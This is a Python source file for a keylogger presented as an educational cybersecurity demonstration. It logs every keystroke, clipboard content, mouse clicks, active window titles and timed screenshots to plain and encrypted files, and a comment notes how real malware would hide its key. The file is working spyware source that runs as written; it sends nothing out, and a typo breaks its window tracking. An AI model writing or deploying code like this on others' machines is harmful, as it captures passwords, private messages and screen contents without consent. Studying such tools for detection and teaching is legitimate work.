from pynput import keyboard, mouse
from PIL import ImageGrab
import logging
import os
import threading
import time
from datetime import datetime
import pyperclip
import json
from cryptography.fernet import Fernet
import base64
import hashlib

# ==================== CONFIGURATION ====================
CONFIG = {
    'log_file': 'keylog.txt',
    'encrypted_log': 'keylog_encrypted.txt',
    'screenshot_folder': 'screenshots',
    'screenshot_interval': 30,  # seconds
    'report_file': 'session_report.json',
    'enable_screenshots': True,
    'enable_clipboard': True,
    'enable_mouse': True,
    'enable_encryption': True,
}

# ==================== ENCRYPTION HANDLER ====================
class EncryptionHandler:
    """Handle encryption of sensitive data"""
    
    def __init__(self):
        # Generate encryption key from password
        password = "cybersecurity2025"  # In real malware, this would be hidden
        self.key = base64.urlsafe_b64encode(
            hashlib.sha256(password.encode()).digest()
        )
        self.cipher = Fernet(self.key)
    
    def encrypt_data(self, data):
        """Encrypt string data"""
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt encrypted data"""
        return self.cipher.decrypt(encrypted_data.encode()).decode()

# ==================== ADVANCED KEYLOGGER CLASS ====================
class AdvancedKeylogger:
    def __init__(self, config):
        self.config = config
        self.encryption = EncryptionHandler() if config['enable_encryption'] else None
        
        # Statistics
        self.stats = {
            'start_time': datetime.now().isoformat(),
            'total_keys': 0,
            'total_special_keys': 0,
            'total_mouse_clicks': 0,
            'total_screenshots': 0,
            'clipboard_captures': 0,
            'active_windows': [],
            'session_duration': 0
        }
        
        # Data storage
        self.key_buffer = []
        self.last_clipboard = ""
        self.current_window = ""
        self.running = True
        
        # Setup
        self._setup_environment()
        self._initialize_logging()
        
        print("\n" + "="*70)
        print(" ADVANCED KEYLOGGER - CYBERSECURITY DEMONSTRATION")
        print("="*70)
        print(f"[+] Session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[+] Log file: {os.path.abspath(self.config['log_file'])}")
        print(f"[+] Screenshot folder: {os.path.abspath(self.config['screenshot_folder'])}")
        print(f"[+] Encryption: {'ENABLED' if self.config['enable_encryption'] else 'DISABLED'}")
        print(f"[+] Screenshot capture: {'ENABLED' if self.config['enable_screenshots'] else 'DISABLED'}")
        print(f"[+] Clipboard monitoring: {'ENABLED' if self.config['enable_clipboard'] else 'DISABLED'}")
        print(f"[+] Mouse tracking: {'ENABLED' if self.config['enable_mouse'] else 'DISABLED'}")
        print("\n[*] Press ESC to stop the keylogger")
        print("-"*70 + "\n")
    
    def _setup_environment(self):
        """Create necessary folders and files"""
        if self.config['enable_screenshots']:
            os.makedirs(self.config['screenshot_folder'], exist_ok=True)
        
        # Create log file with header
        with open(self.config['log_file'], 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*70}\n")
            f.write(f"SESSION STARTED: {datetime.now()}\n")
            f.write(f"{'='*70}\n\n")
    
    def _initialize_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            filename=self.config['log_file'],
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
    
    # ==================== KEYSTROKE MONITORING ====================
    def on_press(self, key):
        """Handle key press events"""
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            if hasattr(key, 'char') and key.char is not None:
                # Regular character key
                key_data = key.char
                self.stats['total_keys'] += 1
                log_msg = f"[KEY] {key_data}"
                print(f"[{timestamp}] Key: {key_data}")
                
            else:
                # Special key
                key_data = f"[{str(key).replace('Key.', '').upper()}]"
                self.stats['total_special_keys'] += 1
                log_msg = f"[SPECIAL] {key_data}"
                print(f"[{timestamp}] Special: {key_data}")
                
                # Stop on ESC
                if key == keyboard.Key.esc:
                    self.running = False
                    return False
            
            # Log to file
            self.key_buffer.append(key_data)
            logging.info(log_msg)
            
            # Encrypt and save if enabled
            if self.config['enable_encryption']:
                self._save_encrypted(log_msg)
            
            # Flush buffer periodically
            if len(self.key_buffer) >= 20:
                self._flush_buffer()
                
        except Exception as e:
            logging.error(f"Error in on_press: {e}")
    
    def _flush_buffer(self):
        """Write buffer to file"""
        if self.key_buffer:
            text = ''.join(self.key_buffer)
            with open(self.config['log_file'], 'a', encoding='utf-8') as f:
                f.write(f"[BUFFER] {text}\n")
            self.key_buffer.clear()
    
    def _save_encrypted(self, data):
        """Save encrypted log entry"""
        try:
            encrypted = self.encryption.encrypt_data(data)
            with open(self.config['encrypted_log'], 'a') as f:
                f.write(encrypted + "\n")
        except Exception as e:
            logging.error(f"Encryption error: {e}")
    
    # ==================== MOUSE MONITORING ====================
    def on_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if pressed and self.config['enable_mouse']:
            self.stats['total_mouse_clicks'] += 1
            timestamp = datetime.now().strftime('%H:%M:%S')
            log_msg = f"[MOUSE] Click at ({x}, {y}) with {button}"
            logging.info(log_msg)
            print(f"[{timestamp}] Mouse: {button} at ({x}, {y})")
    
    # ==================== SCREENSHOT CAPTURE ====================
    def capture_screenshot(self):
        """Capture screenshots at intervals"""
        while self.running:
            if self.config['enable_screenshots']:
                try:
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"{self.config['screenshot_folder']}/screenshot_{timestamp}.png"
                    screenshot = ImageGrab.grab()
                    screenshot.save(filename)
                    self.stats['total_screenshots'] += 1
                    logging.info(f"[SCREENSHOT] Saved: {filename}")
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] Screenshot captured")
                except Exception as e:
                    logging.error(f"Screenshot error: {e}")
            
            time.sleep(self.config['screenshot_interval'])
    
    # ==================== CLIPBOARD MONITORING ====================
    def monitor_clipboard(self):
        """Monitor clipboard for copied content"""
        while self.running:
            if self.config['enable_clipboard']:
                try:
                    clipboard_content = pyperclip.paste()
                    if clipboard_content != self.last_clipboard and clipboard_content.strip():
                        self.last_clipboard = clipboard_content
                        self.stats['clipboard_captures'] += 1
                        timestamp = datetime.now().strftime('%H:%M:%S')
                        log_msg = f"[CLIPBOARD] {clipboard_content[:100]}"  # Limit length
                        logging.info(log_msg)
                        print(f"[{timestamp}] Clipboard: {clipboard_content[:50]}...")
                except Exception as e:
                    logging.error(f"Clipboard error: {e}")
            
            time.sleep(2)
    
    # ==================== WINDOW TRACKING ====================
    def track_active_window(self):
        """Track active window titles"""
        try:
            import psutil
            import win32gui
            import win32processa
            
            while self.running:
                try:
                    window = win32gui.GetForegroundWindow()
                    pid = win32process.GetWindowThreadProcessId(window)[1]
                    process = psutil.Process(pid)
                    window_title = win32gui.GetWindowText(window)
                    
                    if window_title and window_title != self.current_window:
                        self.current_window = window_title
                        if window_title not in self.stats['active_windows']:
                            self.stats['active_windows'].append(window_title)
                        
                        log_msg = f"[WINDOW] {window_title} - {process.name()}"
                        logging.info(log_msg)
                        print(f"[{datetime.now().strftime('%H:%M:%S')}] Window: {window_title}")
                except:
                    pass
                
                time.sleep(3)
        except ImportError:
            print("[!] Window tracking requires: pip install pywin32 psutil")
            print("[!] Continuing without window tracking...")
    
    # ==================== SESSION REPORT ====================
    def generate_report(self):
        """Generate comprehensive session report"""
        end_time = datetime.now()
        start_time = datetime.fromisoformat(self.stats['start_time'])
        duration = (end_time - start_time).total_seconds()
        self.stats['session_duration'] = f"{int(duration)} seconds"
        self.stats['end_time'] = end_time.isoformat()
        
        # Save JSON report
        with open(self.config['report_file'], 'w') as f:
            json.dump(self.stats, f, indent=4)
        
        # Print summary
        print("\n" + "="*70)
        print(" SESSION SUMMARY")
        print("="*70)
        print(f"Duration: {self.stats['session_duration']}")
        print(f"Total keystrokes: {self.stats['total_keys']}")
        print(f"Special keys: {self.stats['total_special_keys']}")
        print(f"Mouse clicks: {self.stats['total_mouse_clicks']}")
        print(f"Screenshots: {self.stats['total_screenshots']}")
        print(f"Clipboard captures: {self.stats['clipboard_captures']}")
        print(f"Active windows tracked: {len(self.stats['active_windows'])}")
        print(f"\nReport saved to: {os.path.abspath(self.config['report_file'])}")
        print("="*70 + "\n")
        
        # Write to log file
        with open(self.config['log_file'], 'a') as f:
            f.write(f"\n{'='*70}\n")
            f.write("SESSION SUMMARY\n")
            f.write(f"{'='*70}\n")
            f.write(f"Duration: {self.stats['session_duration']}\n")
            f.write(f"Total Keys: {self.stats['total_keys']}\n")
            f.write(f"Special Keys: {self.stats['total_special_keys']}\n")
            f.write(f"Mouse Clicks: {self.stats['total_mouse_clicks']}\n")
            f.write(f"Screenshots: {self.stats['total_screenshots']}\n")
            f.write(f"Clipboard Captures: {self.stats['clipboard_captures']}\n")
            f.write(f"{'='*70}\n")
    
    # ==================== MAIN EXECUTION ====================
    def start(self):
        """Start all monitoring threads"""
        threads = []
        
        # Screenshot thread
        if self.config['enable_screenshots']:
            screenshot_thread = threading.Thread(target=self.capture_screenshot, daemon=True)
            screenshot_thread.start()
            threads.append(screenshot_thread)
        
        # Clipboard thread
        if self.config['enable_clipboard']:
            clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
            clipboard_thread.start()
            threads.append(clipboard_thread)
        
        # Window tracking thread
        window_thread = threading.Thread(target=self.track_active_window, daemon=True)
        window_thread.start()
        threads.append(window_thread)
        
        # Mouse listener
        if self.config['enable_mouse']:
            mouse_listener = mouse.Listener(on_click=self.on_click)
            mouse_listener.start()
        
        # Keyboard listener (blocking)
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        
        # Cleanup
        self.running = False
        self._flush_buffer()
        time.sleep(2)  # Wait for threads to finish
        self.generate_report()

# ==================== MAIN ENTRY POINT ====================
def main():
    """Main execution function"""
    print("\n" + "="*70)
    print(" ADVANCED KEYLOGGER - EDUCATIONAL CYBERSECURITY TOOL")
    print("="*70)
    print(" WARNING: This tool is for EDUCATIONAL PURPOSES ONLY")
    print(" Only use on systems you own or have explicit permission to test")
    print("="*70)
    
    input("\nPress ENTER to start the keylogger...")
    
    # Initialize and start keylogger
    keylogger = AdvancedKeylogger(CONFIG)
    keylogger.start()
    
    print("\n[✓] Keylogger stopped successfully")
    print("[✓] All logs and reports saved")
    print("\nThank you for using this educational tool responsibly!")

if __name__ == "__main__":
    main()